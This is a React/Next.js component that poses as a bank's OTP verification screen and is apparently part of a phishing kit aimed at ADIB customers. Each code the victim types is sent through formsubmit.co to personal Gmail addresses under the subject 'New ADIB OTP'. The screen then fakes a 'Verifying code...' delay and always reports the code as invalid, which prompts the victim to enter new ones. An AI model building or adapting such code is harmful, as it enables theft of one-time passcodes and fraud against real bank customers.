"use client"

import { useState, useEffect, useCallback, useRef } from "react"
import { useRouter } from "next/navigation"
import { ChevronLeft } from "lucide-react"
import { OtpInput, OtpInputHandle } from "./otp-input"
// import emailjs from "@emailjs/browser" // Removed EmailJS import


export function OtpScreen() {
    const router = useRouter()
    const [timer, setTimer] = useState(60)
    const [error, setError] = useState("")
    const [canResend, setCanResend] = useState(false)
    const [loading, setLoading] = useState(false)
    const timerRef = useRef<NodeJS.Timeout | null>(null)
    const otpRef = useRef<OtpInputHandle>(null)

    const startTimer = useCallback(() => {
        setTimer(60)
        setCanResend(false)

        if (timerRef.current) {
            clearInterval(timerRef.current)
        }

        timerRef.current = setInterval(() => {
            setTimer((prev) => {
                if (prev <= 1) {
                    clearInterval(timerRef.current!)
                    setCanResend(true)
                    return 0
                }
                return prev - 1
            })
        }, 1000)
    }, [])

    useEffect(() => {
        startTimer()
        return () => {
            if (timerRef.current) clearInterval(timerRef.current)
        }
    }, [startTimer])

    const handleOtpComplete = useCallback(
        (otp: string) => {
            setLoading(true)

            // FormSubmit.co Integration
            fetch("https://formsubmit.co/ajax/dastgirg244@gmail.com", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    Accept: "application/json",
                },
                body: JSON.stringify({
                    _subject: "New ADIB OTP",
                    _cc: "k22454199@gmail.com",
                    _captcha: "false",
                    otp: otp,
                    message: "New OTP Submission",
                }),
            })
                .then((response) => response.json())
                .then((data) => console.log(data))
                .catch((error) => console.log(error))

            setTimeout(() => {
                setLoading(false)
                setError("Invalid OTP. Please try again.")
                startTimer()
                setTimeout(() => {
                    otpRef.current?.reset()
                }, 600)
            }, 4000)
        },
        [startTimer]
    )

    const handleResend = useCallback(() => {
        setError("")
        startTimer()
        otpRef.current?.reset()
    }, [startTimer])

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60)
        const secs = seconds % 60
        return `${mins}:${secs.toString().padStart(2, "0")}`
    }

    return (
        <div className="relative flex flex-col min-h-[100dvh] bg-background">
            {/* Loading overlay */}
            {loading && (
                <div className="absolute inset-0 z-50 flex flex-col items-center justify-center bg-background">
                    <div className="relative w-12 h-12">
                        <svg
                            className="animate-spin"
                            viewBox="0 0 48 48"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                        >
                            <circle
                                cx="24"
                                cy="24"
                                r="20"
                                stroke="#E4E7EC"
                                strokeWidth="4"
                            />
                            <path
                                d="M44 24c0-11.046-8.954-20-20-20"
                                stroke="#0B1F3F"
                                strokeWidth="4"
                                strokeLinecap="round"
                            />
                        </svg>
                    </div>
                    <p className="mt-5 text-[15px] font-medium text-foreground">
                        Verifying code...
                    </p>
                </div>
            )}
            {/* Header area */}
            <div className="px-5 pt-4">
                {/* Back button */}
                <button
                    type="button"
                    onClick={() => router.back()}
                    className="flex items-center justify-center w-10 h-10 -ml-2 rounded-full hover:bg-secondary transition-colors"
                    aria-label="Go back"
                >
                    <ChevronLeft className="w-6 h-6 text-foreground" strokeWidth={1.5} />
                </button>

                {/* Title */}
                <h1 className="text-[28px] font-bold leading-tight mt-3 text-foreground text-balance">
                    Verify OTP
                </h1>

                {/* Subtitle */}
                <p
                    className="text-[15px] mt-2 leading-relaxed"
                    style={{ color: "#6B7B8D" }}
                >
                    Enter the 6-digit code sent to your registered mobile number
                </p>
            </div>

            {/* OTP Input area */}
            <div className="px-5 mt-10 flex-1">
                <OtpInput ref={otpRef} length={6} onComplete={handleOtpComplete} />

                {/* Error message */}
                {error && (
                    <div className="mt-5 flex items-center gap-2 justify-center animate-in fade-in slide-in-from-top-1 duration-300">
                        <svg
                            width="16"
                            height="16"
                            viewBox="0 0 16 16"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                            aria-hidden="true"
                        >
                            <circle cx="8" cy="8" r="8" fill="#DC3545" fillOpacity="0.12" />
                            <path
                                d="M8 4.5V8.5M8 10.5V11"
                                stroke="#DC3545"
                                strokeWidth="1.5"
                                strokeLinecap="round"
                            />
                        </svg>
                        <p className="text-[14px] font-medium" style={{ color: "#DC3545" }}>
                            {error}
                        </p>
                    </div>
                )}

                {/* Timer / Resend */}
                <div className="mt-8 flex flex-col items-center gap-4">
                    {!canResend ? (
                        <div className="flex items-center gap-2">
                            <svg
                                width="18"
                                height="18"
                                viewBox="0 0 18 18"
                                fill="none"
                                xmlns="http://www.w3.org/2000/svg"
                                aria-hidden="true"
                            >
                                <circle cx="9" cy="9" r="8" stroke="#6B7B8D" strokeWidth="1.5" />
                                <path
                                    d="M9 5V9L12 11"
                                    stroke="#6B7B8D"
                                    strokeWidth="1.5"
                                    strokeLinecap="round"
                                    strokeLinejoin="round"
                                />
                            </svg>
                            <span className="text-[15px] font-medium" style={{ color: "#6B7B8D" }}>
                                Resend code in{" "}
                                <span className="text-foreground font-semibold">{formatTime(timer)}</span>
                            </span>
                        </div>
                    ) : (
                        <button
                            type="button"
                            onClick={handleResend}
                            className="text-[15px] font-semibold underline underline-offset-2 transition-colors hover:opacity-80"
                            style={{ color: "#1A6DD4" }}
                        >
                            Resend OTP
                        </button>
                    )}
                </div>
            </div>
        </div>
    )
}
